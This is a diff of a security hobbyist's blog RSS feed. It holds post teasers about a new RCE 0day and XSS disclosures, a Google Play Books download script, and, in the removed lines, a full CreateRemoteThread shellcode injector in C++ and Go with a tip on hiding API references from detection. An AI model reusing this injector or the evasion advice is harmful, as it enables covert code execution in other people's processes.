@@ -1,358 +1,67 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-    <channel>
-        <title>Posts on thatsn0tmysite</title>
-        <link>/posts/</link>
-        <description>Recent content in Posts on thatsn0tmysite</description>
-        <generator>Hugo -- gohugo.io</generator>
-        <language>en-us</language>
-        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 01 Jun 2021 00:41:45 +0200</lastBuildDate>
-        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
-        
-        <item>
-            <title>Approaching Windows</title>
-            <link>/posts/2021/06/approaching-windows/</link>
-            <pubDate>Tue, 01 Jun 2021 00:41:45 +0200</pubDate>
-            
-            <guid>/posts/2021/06/approaching-windows/</guid>
-            <description>Well, hello there! Last few weeks have been a little busy between my mere analog life and pwning industrial ovens work. Lately I have been banging my head against this thing known as Windows.
+  <channel>
+    <title>Posts on thatsn0tmysite</title>
+    <link>/posts/</link>
+    <description>Recent content in Posts on thatsn0tmysite</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+    <lastBuildDate>Fri, 24 Dec 2021 21:48:00 +0100</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>How to summon RCEs</title>
+      <link>/posts/2021/12/how-to-summon-rces/</link>
+      <pubDate>Fri, 24 Dec 2021 21:48:00 +0100</pubDate>
+      
+      <guid>/posts/2021/12/how-to-summon-rces/</guid>
+      <description>How to summon RCEs The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: shell_exec.
+In the last couple weeks I was waiting for ZDI to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS.</description>
+    </item>
+    
+    <item>
+      <title>Approaching Windows</title>
+      <link>/posts/2021/06/approaching-windows/</link>
+      <pubDate>Tue, 01 Jun 2021 00:41:45 +0200</pubDate>
+      
+      <guid>/posts/2021/06/approaching-windows/</guid>
+      <description>Well, hello there! Last few weeks have been a little busy between my mere analog life and pwning industrial ovens work. Lately I have been banging my head against this thing known as Windows.
 Its APIs to be precise, as I am trying to move out of my comfort zone of &amp;ldquo;development&amp;rdquo; (I am by no means a developer, but when I make stuff, it&amp;rsquo;s usually on Linux).
 As a side note, while we&amp;rsquo;re talking about development, I recently decided to produce a rip-off of the amazing xsshunter and write it in Go.</description>
-            <content type="html"><![CDATA[<p>Well, hello there! Last few weeks have been a little busy between my mere analog life and <del>pwning industrial ovens</del> work.
-Lately I have been banging my head against this thing known as <strong>Windows</strong>.</p>
-<p>Its APIs to be precise, as I am trying to move out of my comfort zone of &ldquo;development&rdquo; (I am by <strong>no means</strong> a developer, but when I make stuff, it&rsquo;s usually on Linux).</p>
-<p>As a side note, while we&rsquo;re talking about development, I recently decided to produce a rip-off of the amazing <a href="https://xsshunter.com">xsshunter</a> and write it in Go.
-Mostly as a learning exercise for Go stuff. It&rsquo;s coded like shit, and currenty on the low priority list, so feel free to hop in and <a href="https://github.com/thatsn0tmysite/xsserve">help</a>.</p>
-<p>Now, back to Windows. While there are a lot of complaints I have, mostly about situations where you read the documentation and end up facing a dead end because whatever you are looking at is undocumented&hellip; and the only information you can find about the topic is from some temporary account on codeproject, which made a stackoverflow question 8 years ago, which he self-answered. For Windows XP, SP1.</p>
-<p>Looking at you &ldquo;dwData&rdquo; pointers&hellip;</p>
-<p>So, to try and keep this post half-useful, I am gonna paste here a shellcode injector written in both, C++ and Go; using the overly (ab)used CreateRemoteThread technique.</p>
-<p>The idea is simple, we just create a thread on a remote process, and give it our shellcode to run, this will run inside another process and will stay &ldquo;in memory&rdquo;.
-To do this we will need a way obtain a handle of a give process (<strong>OpenProcess</strong>), to allocate memory area and make it executable (<strong>VirtualAllocEx</strong> and <strong>VirtualProtectEx</strong>), to write to said area (<strong>WriteProcessMemory</strong>) and finally a way to create the remote thread  (<strong>CreateRemoteThread</strong>).</p>
-<p>This is a pretty standard way. So let&rsquo;s get threading!</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#cd2828;font-weight:bold">
-</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;processthreadsapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
-</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;memoryapi.h&gt;</span><span style="color:#cd2828;font-weight:bold">
-</span><span style="color:#cd2828;font-weight:bold"></span>
-<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(UINT pid, BYTE[] shellcode, SIZE_T sh_size) {
-	HANDLE hProc, hThread;
-	LPVOID lpStartAddress;
-	<span style="color:#6ab825;font-weight:bold">int</span> writeProcError;
-	DWORD lpflOldProtect = PAGE_READWRITE;
-
-	<span style="color:#999;font-style:italic">//Get a handle from the given pid
-</span><span style="color:#999;font-style:italic"></span>	hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
-	<span style="color:#6ab825;font-weight:bold">if</span> (!hProc) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.	
-</span><span style="color:#999;font-style:italic"></span>	lpStartAddress = (LPVOID)VirtualAllocEx(hProc, <span style="color:#24909d">NULL</span>, sh_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	<span style="color:#6ab825;font-weight:bold">if</span> (lpStartAddress == <span style="color:#24909d">NULL</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">2</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process,
-</span><span style="color:#999;font-style:italic"></span>	writeProcError = WriteProcessMemory(hProc, lpStartAddress, shellcode, sh_size, <span style="color:#24909d">NULL</span>);
-	<span style="color:#6ab825;font-weight:bold">if</span> (writeProcError == <span style="color:#3677a9">0</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">3</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
-</span><span style="color:#999;font-style:italic"></span>	hThread = CreateRemoteThread(hProc, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, (LPTHREAD_START_ROUTINE)lpStartAddress, <span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#24909d">NULL</span>);
-	<span style="color:#6ab825;font-weight:bold">if</span> (hThread == <span style="color:#24909d">NULL</span>) {
-		<span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">5</span>;
-	}
-
-	<span style="color:#999;font-style:italic">//Close the open handles
-</span><span style="color:#999;font-style:italic"></span>	CloseHandle(hProc);
-
-	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
-}
-</code></pre></div><p>And now the exact same thing, but in Go:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">import</span> (
-	<span style="color:#ed9d13">&#34;syscall&#34;</span>
-	<span style="color:#ed9d13">&#34;unsafe&#34;</span>
-	<span style="color:#ed9d13">&#34;golang.org/x/sys/windows&#34;</span>
-)
-
-<span style="color:#6ab825;font-weight:bold">var</span> (
-	<span style="color:#999;font-style:italic">//DLLs
-</span><span style="color:#999;font-style:italic"></span>	kernel32 = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;kernel32.dll&#34;</span>)
-	user32   = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;user32.dll&#34;</span>)
-	ntdll    = syscall.<span style="color:#447fcf">NewLazyDLL</span>(<span style="color:#ed9d13">&#34;ntdll.dll&#34;</span>)
-)
-
-<span style="color:#6ab825;font-weight:bold">const</span> (
-	PAGE_EXECUTE_READWRITE = <span style="color:#3677a9">0x40</span>
-	PAGE_EXECUTE_READ      = <span style="color:#3677a9">0x20</span>
-	PROCESS_ALL_ACCESS     = <span style="color:#3677a9">0x1F0FFF</span>
-)
-
-<span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">Inj_CreateRemoteThread</span>(pid <span style="color:#6ab825;font-weight:bold">int</span>, shellcode []<span style="color:#6ab825;font-weight:bold">byte</span>) (err <span style="color:#6ab825;font-weight:bold">error</span>) {
-	<span style="color:#999;font-style:italic">//You might want to encrypt references, these may look vErY SuSpIcIouS ;)
-</span><span style="color:#999;font-style:italic"></span>	virtualAllocEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualAllocEx&#34;</span>)
-	openProcess := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;OpenProcess&#34;</span>)
-	virtualProtectEx := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;VirtualProtectEx&#34;</span>)
-	writeProcessMemory := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;WriteProcessMemory&#34;</span>)
-	createRemoteThread := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CreateRemoteThread&#34;</span>)
-	closeHandle := kernel32.<span style="color:#447fcf">NewProc</span>(<span style="color:#ed9d13">&#34;CloseHandle&#34;</span>)
-
-	memProtect := windows.PAGE_READWRITE
-
-	<span style="color:#999;font-style:italic">//Get a handle from the given pid
-</span><span style="color:#999;font-style:italic"></span>	handle, _, err := openProcess.<span style="color:#447fcf">Call</span>(PROCESS_ALL_ACCESS, <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(pid))
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Allocate some space into the remote process, big enough to host our shellcode.
-</span><span style="color:#999;font-style:italic"></span>	lpStartAddress, _, err := virtualAllocEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Write our shellcode to the allocated memory on the remote process
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = writeProcessMemory.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, (<span style="color:#6ab825;font-weight:bold">uintptr</span>)(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;shellcode[<span style="color:#3677a9">0</span>])), <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), <span style="color:#3677a9">0</span>)
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Change the memory to be executable
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//WARN: this is unneeded if we change VirtualAllocEx to set the memory as PAGE_EXECUTE_READWRITE
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = virtualProtectEx.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), lpStartAddress, <span style="color:#24909d">uintptr</span>(<span style="color:#24909d">len</span>(shellcode)), windows.PAGE_EXECUTE_READ, <span style="color:#24909d">uintptr</span>(unsafe.<span style="color:#447fcf">Pointer</span>(&amp;memProtect)))
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Create &amp; run a remote thread which points to the start of the memory holding the shellcode
-</span><span style="color:#999;font-style:italic"></span>	<span style="color:#999;font-style:italic">//we are discarding the handle to the thread, this might not be what you want in a real scenario.
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = createRemoteThread.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle), <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, lpStartAddress, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>)
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#999;font-style:italic">//Close the process handle
-</span><span style="color:#999;font-style:italic"></span>	_, _, err = closeHandle.<span style="color:#447fcf">Call</span>(<span style="color:#24909d">uintptr</span>(handle))
-	<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#447fcf">isErr</span>(err) != <span style="color:#6ab825;font-weight:bold">nil</span> {
-		<span style="color:#6ab825;font-weight:bold">return</span> err
-	}
-
-	<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">nil</span>
-}
-</code></pre></div><p>As you see, the process is almost the same, mostly thanks to the <strong>golang.org/x/sys/windows</strong>  package. Now, in a real-world scenario just plain injecting the shellcode may not be as easy, as the injector is still highly easy to spot (common API pattern, cleartext references, etc).</p>
-<p>Anyhow, Windows makes it generally pretty straight forward to perform operations on remote processes, no wonder userspace malwares are so popular! They are easy to implement, quick to develop and if they get caught, well&hellip; just make a new one.</p>
-<p>I do plan on eventually sharing other snippets for stuff I find interesting, Windows-related&hellip; this is if I don&rsquo;t get slapped to numbness with a printed version of MSDN by my friend that has been trying to get me to learn all this shit.</p>
-<p>Over and out.</p>
-<hr>
-<p><strong>Update:</strong></p>
-<p>As I was testing (and correcting) the C++ code I noticed there was a useless step in the function: I was allocating an area as Read-Write and only later modifying it to be executable.
-This was indeed unneeded.</p>
-<p>While it worked, one can totally skip the <strong>VirtualProtectEx</strong> in the Go version, and just do as the updated C++ code: calling <strong>VirtualAllocEx</strong> with <code>PAGE_EXECUTE_READ_WRITE</code>.</p>
-<p>I&rsquo;ll leave the Go version as a reference for stupid code and use this as an excuse to avoid modifying it because I really want to watch another episode of Battlestar Galactica, instead of removing a few lines of code. I&rsquo;m lazy, fight me&hellip;or don&rsquo;t, it&rsquo;s less tiring.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Go(ogle) Play Books</title>
-            <link>/posts/2021/04/google-play-books/</link>
-            <pubDate>Fri, 09 Apr 2021 21:35:36 +0200</pubDate>
-            
-            <guid>/posts/2021/04/google-play-books/</guid>
-            <description>The title is kind of a very bad pun, one of the &amp;ldquo;that&amp;rsquo;s not even funny&amp;rdquo; ones. So, what is today&amp;rsquo;s post about? Google.
+    </item>
+    
+    <item>
+      <title>Go(ogle) Play Books</title>
+      <link>/posts/2021/04/google-play-books/</link>
+      <pubDate>Fri, 09 Apr 2021 21:35:36 +0200</pubDate>
+      
+      <guid>/posts/2021/04/google-play-books/</guid>
+      <description>The title is kind of a very bad pun, one of the &amp;ldquo;that&amp;rsquo;s not even funny&amp;rdquo; ones. So, what is today&amp;rsquo;s post about? Google.
 No, not the privacy concerns or the data usage policies, nor their silly Google Play Store rules. Not the tracking, not the fact that their products seem to be walking dead bodies before they reach their prime time (looking at you Stadia)&amp;hellip; but books.
 I recently decided to download back all the e-books which I so carefully uploaded over the year to their Books service back&amp;hellip;</description>
-            <content type="html"><![CDATA[<p>The title is kind of a very bad pun, one of the &ldquo;that&rsquo;s not even funny&rdquo; ones. So, what is today&rsquo;s post about? Google.</p>
-<p>No, not the privacy concerns or the data usage policies, nor their silly Google Play Store rules. Not the tracking, not the fact that their products seem to be walking dead bodies before they reach their prime time (looking at you Stadia)&hellip; but books.</p>
-<p>I recently decided to download back all the e-books which I so carefully uploaded over the year to their Books service back&hellip;</p>
-<p>I thought it would take me half a second (more like a bunch of hours, considering the near dial-up internet connection I have recently), but: nope! Apparently my assumptions about a big blue button saying &ldquo;Download all&rdquo;, right there, in plain sight for the user to press were wrong.</p>
-<p>Now, chances are I could be VERY blind and have totally missed it, but that hasn&rsquo;t stopped me from <del>finding a lame excuse to code in Go</del> finding a way around the problem.</p>
-<p>So, since I was only able to download <strong>one-book-at-the-time</strong>, which I guess is fine for say&hellip; 1 to 5 books, it looked quite a chore to do it 130+ times.</p>
-<p>Took me around 20 minutes to hack this thing together. Now&hellip; I know the code is ugly, I know it&rsquo;s messy, I know I could have tried just a little bit harder to use selenium instead of <strong>saving the rendered page from the browser</strong> and parsing it&hellip; but I just wanted my books back! D:</p>
-<p>So without any further ado&hellip; here it goes, in all its gorgeous monstrosity, <strong>GoGetMyBooks</strong>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">package</span> main
-
-<span style="color:#6ab825;font-weight:bold">import</span> (
-        <span style="color:#ed9d13">&#34;fmt&#34;</span>
-        <span style="color:#ed9d13">&#34;io&#34;</span>
-        <span style="color:#ed9d13">&#34;mime&#34;</span>
-        <span style="color:#ed9d13">&#34;net/http&#34;</span>
-        <span style="color:#ed9d13">&#34;net/url&#34;</span>
-        <span style="color:#ed9d13">&#34;os&#34;</span>
-        <span style="color:#ed9d13">&#34;strings&#34;</span>
-        <span style="color:#ed9d13">&#34;sync&#34;</span>
-
-        <span style="color:#ed9d13">&#34;github.com/antchfx/htmlquery&#34;</span>
-)
-
-<span style="color:#6ab825;font-weight:bold">type</span> Book <span style="color:#6ab825;font-weight:bold">struct</span> {
-        Title <span style="color:#6ab825;font-weight:bold">string</span>
-        URL   <span style="color:#6ab825;font-weight:bold">string</span>
-        ID    <span style="color:#6ab825;font-weight:bold">string</span>
-}
-
-<span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">main</span>() {
-        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;&gt; GoGetMyBooks v.0.1 - by thatsn0tmysite (a.k.a. n0tme)&#34;</span>)
-         
-        cookies := <span style="color:#ed9d13">&#34;&#34;</span> <span style="color:#999;font-style:italic">// Too lazy to use the flag package, or sys.argv, or anything really...
-</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">if</span> cookies == <span style="color:#ed9d13">&#34;&#34;</span> {
-                <span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;Error: variable cookies has no value... copy it from your browser requests&#34;</span>)
-        }
-        c := &amp;http.Client{}
-
-        <span style="color:#999;font-style:italic">// Read Google Play.html
-</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">var</span> books []Book
-        booksHTML, err := htmlquery.<span style="color:#447fcf">LoadDoc</span>(<span style="color:#ed9d13">&#34;Google Play.html&#34;</span>)
-        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                <span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;Error: save the Google Play Books page with firefox/chrome&#34;</span>)
-        }
-        nodes, err := htmlquery.<span style="color:#447fcf">QueryAll</span>(booksHTML, <span style="color:#ed9d13">&#34;//a[contains(@class, &#39;overlay&#39;)]&#34;</span>)
-        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                <span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;Error: not a valid XPath expression&#34;</span>)
-        }
-
-        <span style="color:#999;font-style:italic">// yes, we iterate here...
-</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">for</span> _, node := <span style="color:#6ab825;font-weight:bold">range</span> nodes {
-                book := Book{Title: htmlquery.<span style="color:#447fcf">SelectAttr</span>(node, <span style="color:#ed9d13">&#34;title&#34;</span>), URL: htmlquery.<span style="color:#447fcf">SelectAttr</span>(node, <span style="color:#ed9d13">&#34;href&#34;</span>)}
-                u, _ := url.<span style="color:#447fcf">Parse</span>(book.URL) <span style="color:#999;font-style:italic">// blindly assume this won&#39;t fail
-</span><span style="color:#999;font-style:italic"></span>                book.ID = strings.<span style="color:#447fcf">Split</span>(u.RawQuery, <span style="color:#ed9d13">&#34;=&#34;</span>)[<span style="color:#3677a9">1</span>]
-                books = <span style="color:#24909d">append</span>(books, book)
-        }
-        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Found &#34;</span>, <span style="color:#24909d">len</span>(books), <span style="color:#ed9d13">&#34; books...&#34;</span>)
-
-        <span style="color:#999;font-style:italic">// ...and here, useless, but whatever...
-</span><span style="color:#999;font-style:italic"></span>        <span style="color:#6ab825;font-weight:bold">var</span> wg sync.WaitGroup
-        <span style="color:#6ab825;font-weight:bold">for</span> _, book := <span style="color:#6ab825;font-weight:bold">range</span> books {
-                wg.<span style="color:#447fcf">Add</span>(<span style="color:#3677a9">1</span>)
-
-                <span style="color:#999;font-style:italic">//GOGOGO!
-</span><span style="color:#999;font-style:italic"></span>                <span style="color:#6ab825;font-weight:bold">go</span> <span style="color:#6ab825;font-weight:bold">func</span>(book Book) {
-                        <span style="color:#6ab825;font-weight:bold">defer</span> wg.<span style="color:#447fcf">Done</span>()
-                        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Processing: &#34;</span>, book.Title)
-
-                        <span style="color:#999;font-style:italic">//filename was unnecessary, so i am using iwantmyfileback
-</span><span style="color:#999;font-style:italic"></span>                        downloadURL := fmt.<span style="color:#447fcf">Sprintf</span>(<span style="color:#ed9d13">&#34;https://books.google.com/books/download/iwantmyfileback?id=%v&amp;output=uploaded_content&amp;source=gbs_api&amp;authuser=0&#34;</span>, book.ID)
-                        req, err := http.<span style="color:#447fcf">NewRequest</span>(<span style="color:#ed9d13">&#34;GET&#34;</span>, downloadURL, <span style="color:#6ab825;font-weight:bold">nil</span>)
-                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                                fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;httpClientError: &#34;</span>, err)
-                        }
-
-                        <span style="color:#999;font-style:italic">//Set request headers for authentication (not using req.SetCookie because... lazyness)
-</span><span style="color:#999;font-style:italic"></span>                        req.Header.<span style="color:#447fcf">Set</span>(<span style="color:#ed9d13">&#34;Cookie&#34;</span>, cookies)
-
-                        <span style="color:#999;font-style:italic">// Get the file data
-</span><span style="color:#999;font-style:italic"></span>                        resp, err := c.<span style="color:#447fcf">Do</span>(req)
-                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                                fmt.<span style="color:#447fcf">Print</span>(<span style="color:#ed9d13">&#34;httpClientDoError: &#34;</span>, err)
-                        }
-                        <span style="color:#6ab825;font-weight:bold">defer</span> resp.Body.<span style="color:#447fcf">Close</span>()
-
-                        <span style="color:#999;font-style:italic">// Get a filename
-</span><span style="color:#999;font-style:italic"></span>                        _, params, err := mime.<span style="color:#447fcf">ParseMediaType</span>(resp.Header.<span style="color:#447fcf">Get</span>(<span style="color:#ed9d13">&#34;Content-Disposition&#34;</span>))
-                        filename := <span style="color:#24909d">string</span>(params[<span style="color:#ed9d13">&#34;filename&#34;</span>])
-                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                                <span style="color:#999;font-style:italic">//fmt.Println(&#34;mimeTypeError: &#34;, err)
-</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// for some reason some files throw a mime: invalid media parameter error,
-</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// lets try to handle this quietly forcing a name to the file
-</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// seems to do it on some epub files where it fails to parse the title correctly(?)
-</span><span style="color:#999;font-style:italic"></span>                                <span style="color:#999;font-style:italic">// should we always assume it&#39;s an epub?
-</span><span style="color:#999;font-style:italic"></span>                                x := strings.<span style="color:#447fcf">Split</span>(book.Title, <span style="color:#ed9d13">&#34;.&#34;</span>)
-                                ext := x[<span style="color:#24909d">len</span>(x)-<span style="color:#3677a9">1</span>]
-
-                                <span style="color:#6ab825;font-weight:bold">if</span> ext == <span style="color:#ed9d13">&#34;&#34;</span> {
-                                        filename = fmt.<span style="color:#447fcf">Sprintf</span>(<span style="color:#ed9d13">&#34;%v.%v&#34;</span>, book.Title, <span style="color:#ed9d13">&#34;UNKNOWN_EXTENTION&#34;</span>)
-                                } <span style="color:#6ab825;font-weight:bold">else</span> {
-                                        filename = book.Title
-                                }
-                        }
-
-                        <span style="color:#999;font-style:italic">// Create empty file
-</span><span style="color:#999;font-style:italic"></span>                        out, err := os.<span style="color:#447fcf">Create</span>(filename)
-                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                                fmt.<span style="color:#447fcf">Print</span>(<span style="color:#ed9d13">&#34;osCreateError(&#34;</span>, filename, <span style="color:#ed9d13">&#34;): &#34;</span>, err)
-                        }
-                        <span style="color:#6ab825;font-weight:bold">defer</span> out.<span style="color:#447fcf">Close</span>()
-
-                        <span style="color:#999;font-style:italic">// Save to file
-</span><span style="color:#999;font-style:italic"></span>                        written, err := io.<span style="color:#447fcf">Copy</span>(out, resp.Body)
-                        <span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
-                                fmt.<span style="color:#447fcf">Print</span>(<span style="color:#ed9d13">&#34;ioCopyError: &#34;</span>, err)
-                        }
-                        fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Saved file: &#34;</span>, filename, <span style="color:#ed9d13">&#34; (&#34;</span>, written, <span style="color:#ed9d13">&#34; bytes)&#34;</span>)
-
-                }(book)
-        }
-        wg.<span style="color:#447fcf">Wait</span>()
-}
-
-</code></pre></div><p>The usage is quite simple:</p>
-<ol>
-<li>login to Google Play Books</li>
-</ol>
-<ul>
-<li>copy the Cookie header value from the authenticated requests into the variable <code>cookies</code></li>
-<li>click on the &ldquo;show all&rdquo; button on the Play Books page to list all the books</li>
-<li>ctrl-s / save the page from your browser into <strong>GoGetMyBooks</strong>' working directory (be sure to name it <code>Google Play.html</code>)</li>
-<li>run <strong>GoGetMyBooks</strong></li>
-</ul>
-<p>As some of the comments in the code suggest, there are a few issues like the fact that some books' titles get lost (so it falls back to the uploaded filename).</p>
-<p>So to sum it all up, fuck Javascript &amp;&amp; enjoy my shitty code :).</p>
-<p>See ya next time.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Public disclosures</title>
-            <link>/posts/2021/03/public-disclosures/</link>
-            <pubDate>Tue, 16 Mar 2021 22:37:40 +0100</pubDate>
-            
-            <guid>/posts/2021/03/public-disclosures/</guid>
-            <description>Well, as mentioned in the last post, some lame XSS I found just went public.
+    </item>
+    
+    <item>
+      <title>Public disclosures</title>
+      <link>/posts/2021/03/public-disclosures/</link>
+      <pubDate>Tue, 16 Mar 2021 22:37:40 +0100</pubDate>
+      
+      <guid>/posts/2021/03/public-disclosures/</guid>
+      <description>Well, as mentioned in the last post, some lame XSS I found just went public.
 For those wanting to jump straight to the point:
  muoversiaroma.it romamobile.it travel.mob.cotralspa.it servizi.cotralspa.it  I am a firm believer in the philosophy of &amp;ldquo;disclose as you please&amp;rdquo;, for the vulnerabilities above, I decided to attempt and be as ethical as possible and tried to disclose them responsibly.
 That attempt failed.
 Apparently what a researcher thinks is going to happen and what actually happens not always matches.</description>
-            <content type="html"><![CDATA[<p>Well, as mentioned in the last <a href="/posts/2021/03/first-commit/">post</a>, some lame XSS I found just went public.</p>
-<p>For those wanting to jump straight to the point:</p>
-<ul>
-<li><a href="https://www.openbugbounty.org/reports/1610312/">muoversiaroma.it</a></li>
-<li><a href="https://www.openbugbounty.org/reports/1610327/">romamobile.it</a></li>
-<li><a href="https://www.openbugbounty.org/reports/1610334/">travel.mob.cotralspa.it</a></li>
-<li><a href="https://www.openbugbounty.org/reports/1610344/">servizi.cotralspa.it</a></li>
-</ul>
-<p>I am a firm believer in the philosophy of &ldquo;disclose as you please&rdquo;, for the vulnerabilities above, I decided to attempt and be as ethical as possible and tried to disclose them responsibly.</p>
-<p>That attempt failed.</p>
